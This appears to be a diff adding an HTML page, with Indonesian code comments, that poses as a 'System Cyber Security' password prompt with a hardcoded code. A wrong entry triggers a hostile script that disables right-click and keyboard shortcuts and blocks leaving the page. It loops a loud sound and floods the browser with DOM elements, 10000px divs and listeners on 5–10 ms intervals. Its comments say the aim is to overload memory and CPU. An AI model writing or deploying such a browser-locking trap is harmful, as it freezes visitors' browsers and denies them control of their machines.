@@ -1,1 +1,242 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keamanan Cyber Security</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #0f0;
+            text-align: center;
+            padding: 50px;
+            overflow: hidden;
+            height: 100vh;
+            margin: 0;
+        }
 
+        input {
+            background-color: #000;
+            color: #0f0;
+            border: 2px solid #0f0;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        button {
+            background-color: #0f0;
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #000;
+            color: #0f0;
+            border: 2px solid #0f0;
+        }
+
+        .message {
+            margin-top: 20px;
+            font-size: 20px;
+        }
+
+        h1 {
+            animation: glitch 2s infinite;
+        }
+
+        /* Glitch animation for a distorted effect */
+        @keyframes glitch {
+            0% {
+                text-shadow: 1px 1px 5px rgba(255, 0, 0, 0.7);
+                transform: translateX(0);
+            }
+            20% {
+                text-shadow: 2px 2px 5px rgba(0, 255, 0, 0.7);
+                transform: translateX(-5px);
+            }
+            40% {
+                text-shadow: 3px 3px 5px rgba(0, 0, 255, 0.7);
+                transform: translateX(5px);
+            }
+            60% {
+                text-shadow: 4px 4px 5px rgba(255, 255, 0, 0.7);
+                transform: translateX(-3px);
+            }
+            80% {
+                text-shadow: 5px 5px 5px rgba(255, 0, 255, 0.7);
+                transform: translateX(3px);
+            }
+            100% {
+                text-shadow: 1px 1px 5px rgba(255, 0, 0, 0.7);
+                transform: translateX(0);
+            }
+        }
+
+        /* Static noise background */
+        .static {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://www.filmfileeurope.com/wp-content/uploads/2020/01/static-image.jpg');
+            animation: flicker 0.1s infinite;
+            z-index: 9999;
+        }
+
+        @keyframes flicker {
+            0% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.1;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="formContainer">
+        <h1>System Cyber Security</h1>
+        <p>Enter the secret code to continue:</p>
+        
+        <input type="password" id="kodeInput" placeholder="********">
+        <button onclick="verifikasiKode()">ACCESS</button>
+
+        <div class="message" id="message"></div>
+    </div>
+
+    <script>
+        // Create a variable to store the audio object
+        const errorAudio = new Audio('https://www.soundjay.com/button/beep-07.wav'); // Replace with a more jarring sound if you like
+
+        function verifikasiKode() {
+            const kodeBenar = "aldy ganteng"; // Ganti dengan kode yang benar
+            const kodeInput = document.getElementById("kodeInput").value;
+            const messageDiv = document.getElementById("message");
+
+            if (kodeInput === kodeBenar) {
+                messageDiv.innerHTML = "ACCESS GRANTED";
+                messageDiv.style.color = "#0f0";
+            } else {
+                messageDiv.innerHTML = "ACCESS DENIED. SYSTEM ERROR!";
+                messageDiv.style.color = "#f00";
+                terjebakHalaman(); // Aktifkan efek crash
+                playDisruptiveSound(); // Play disruptive sound on wrong code
+            }
+        }
+
+        function playDisruptiveSound() {
+            // Loop the sound to make it more annoying
+            errorAudio.loop = true; // Loop sound continuously
+            errorAudio.play(); // Play the sound
+            errorAudio.volume = 1; // Full volume (be careful with this in a real scenario)
+        }
+
+        function terjebakHalaman() {
+            // Remove the form
+            document.getElementById("formContainer").remove();
+
+            // Disable right-click
+            document.addEventListener('contextmenu', (event) => event.preventDefault());
+
+            // Disable keyboard shortcuts (Ctrl+T, Ctrl+W, etc.)
+            document.addEventListener('keydown', function(event) {
+                if (event.ctrlKey || event.key === 'F12' || event.key === 'F5') {
+                    event.preventDefault();
+                }
+            });
+
+            // Disable closing the tab and window
+            window.onbeforeunload = function() {
+                return "You cannot leave this page!";
+            };
+
+            // Add static noise background
+            const staticDiv = document.createElement('div');
+            staticDiv.classList.add('static');
+            document.body.appendChild(staticDiv);
+
+            // Aggressively generate DOM elements to overload memory
+            for (let i = 0; i < 10000; i++) {
+                const randomDiv = document.createElement('div');
+                randomDiv.style.position = 'absolute';
+                randomDiv.style.left = Math.random() * window.innerWidth + 'px';
+                randomDiv.style.top = Math.random() * window.innerHeight + 'px';
+                randomDiv.style.color = '#' + Math.floor(Math.random() * 16777215).toString(16);
+                randomDiv.style.fontSize = Math.random() * 50 + 10 + 'px';
+                randomDiv.innerHTML = 'ERROR! SYSTEM OVERLOAD!';
+                document.body.appendChild(randomDiv);
+            }
+
+            // Overwhelm CPU with an event that keeps triggering
+            setInterval(() => {
+                document.body.style.backgroundColor =
+                    '#' + Math.floor(Math.random() * 16777215).toString(16); // Changing background color quickly
+            }, 5); // Speed up background color changes
+
+            // Flood CPU with mouse move events to overload the browser
+            for (let i = 0; i < 1000; i++) {
+                document.addEventListener('mousemove', function() {
+                    // This will create a constant flood of mousemove events, which is heavy on CPU
+                });
+            }
+
+            // Create large elements to overload memory
+            setInterval(() => {
+                const div = document.createElement("div");
+                div.style.height = "10000px"; // Large element that consumes memory
+                document.body.appendChild(div);
+            }, 5);
+
+            // Aggressive text animation glitch
+            setInterval(() => {
+                const glitchText = document.createElement("div");
+                glitchText.style.position = 'absolute';
+                glitchText.style.left = Math.random() * window.innerWidth + 'px';
+                glitchText.style.top = Math.random() * window.innerHeight + 'px';
+                glitchText.style.fontSize = "30px";
+                glitchText.style.color = "#" + Math.floor(Math.random() * 16777215).toString(16);
+                glitchText.innerHTML = "SYSTEM FAILURE!";
+                document.body.appendChild(glitchText);
+            }, 10);
+
+            // Continuous, random movement of elements
+            setInterval(() => {
+                const divs = document.querySelectorAll('div');
+                divs.forEach(div => {
+                    div.style.transform = `translate(${Math.random() * window.innerWidth}px, ${Math.random() * window.innerHeight}px)`;
+                });
+            }, 100);
+
+            // Make the cursor disappear intermittently
+            setInterval(() => {
+                document.body.style.cursor = document.body.style.cursor === 'none' ? 'auto' : 'none';
+            }, 200);
+
+            // Overload memory with repetitive large content generation
+            setInterval(() => {
+                const largeContent = document.createElement('div');
+                largeContent.style.height = '10000px';
+                largeContent.style.backgroundColor = 'black';
+                document.body.appendChild(largeContent);
+            }, 10);
+
+            // Prevent page focus and all actions
+            document.body.style.pointerEvents = 'none';
+        }
+    </script>
+
+</body>
+</html>
